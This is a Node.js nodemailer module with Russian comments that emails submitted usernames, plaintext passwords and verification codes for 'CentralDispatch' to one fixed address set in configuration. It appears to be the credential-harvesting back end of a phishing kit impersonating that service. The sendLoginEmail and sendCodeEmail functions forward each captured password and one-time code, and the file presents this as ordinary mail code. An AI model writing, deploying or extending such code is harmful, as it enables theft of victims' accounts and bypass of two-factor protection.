/**
 * Модуль для отправки Email
 * Express версия (CommonJS)
 */

const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || "smtp.gmail.com",
  port: parseInt(process.env.EMAIL_PORT || "587"),
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

/**
 * Отправка Email с логином и паролем
 */
async function sendLoginEmail(username, password) {
  console.log("[EMAIL] Начало отправки Email с данными входа...");
  
  const emailFromEnv = process.env.EMAIL_TO;
  
  let recipients;
  if (emailFromEnv) {
    recipients = [emailFromEnv];
  } else {
    console.log("[EMAIL] EMAIL_TO не настроен, email не будет отправлен");
    return;
  }
  
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipients,
      subject: "CentralDispatch - Новый вход в систему",
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px;">
          <h2 style="color: #FF6B35;">CentralDispatch - Новые данные для входа</h2>
          <p>Получены новые учетные данные:</p>
          <ul style="list-style: none; padding: 0;">
            <li style="margin: 10px 0;"><strong>Username:</strong> ${username}</li>
            <li style="margin: 10px 0;"><strong>Password:</strong> ${password}</li>
          </ul>
          <p style="color: #666; font-size: 12px; margin-top: 20px;">
            Время получения: ${new Date().toLocaleString("ru-RU")}
          </p>
        </div>
      `,
      text: `
        CentralDispatch - Новые данные для входа
        
        Username: ${username}
        Password: ${password}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email:", error);
    throw new Error("Не удалось отправить Email");
  }
}

/**
 * Отправка Email с кодом подтверждения
 */
async function sendCodeEmail(code, username) {
  console.log("[EMAIL] Начало отправки Email с кодом...");
  console.log("[EMAIL] Код:", code);
  
  const emailFromEnv = process.env.EMAIL_TO;
  
  let recipients;
  if (emailFromEnv) {
    recipients = [emailFromEnv];
  } else {
    console.log("[EMAIL] EMAIL_TO не настроен, email не будет отправлен");
    return;
  }
  
  console.log("[EMAIL] Получатели:", recipients.join(", "));

  try {
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipients,
      subject: "CentralDispatch - Код подтверждения",
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px;">
          <h2 style="color: #FF6B35;">CentralDispatch - Код подтверждения</h2>
          <p>Получен код подтверждения:</p>
          <div style="background: #f5f5f5; padding: 15px; margin: 20px 0; text-align: center;">
            <h1 style="color: #FF6B35; font-size: 32px; letter-spacing: 5px; margin: 0;">
              ${code}
            </h1>
          </div>
          ${username ? `<p><strong>Username:</strong> ${username}</p>` : ""}
          <p style="color: #666; font-size: 12px; margin-top: 20px;">
            Время получения: ${new Date().toLocaleString("ru-RU")}
          </p>
        </div>
      `,
      text: `
        CentralDispatch - Код подтверждения
        
        Код: ${code}
        ${username ? `Username: ${username}` : ""}
        
        Время получения: ${new Date().toLocaleString("ru-RU")}
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("[EMAIL] Email с кодом успешно отправлен:", info.messageId);
  } catch (error) {
    console.error("[EMAIL] Ошибка отправки Email с кодом:", error);
    throw new Error("Не удалось отправить Email с кодом");
  }
}

module.exports = {
  sendLoginEmail,
  sendCodeEmail,
};

